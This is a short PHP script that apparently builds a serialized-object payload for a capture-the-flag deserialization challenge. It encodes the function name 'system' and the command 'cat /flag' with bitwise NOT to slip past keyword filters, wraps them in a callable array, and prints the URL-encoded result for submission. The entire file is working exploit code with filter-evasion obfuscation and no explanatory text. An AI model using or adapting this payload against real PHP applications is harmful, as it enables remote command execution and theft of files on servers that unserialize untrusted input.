<?php
class phone{
    public $a;
    public function test() {}
}

class please{
    public $a;
    public function __construct(){
        $phone = new phone();
        $phone->a = "\$_=~\"".~'system'."\";" . "\$_(~\"".~'cat /flag'."\");";
        $this->a = [$phone, 'test'];
    }
}

echo urlencode(serialize(new please()));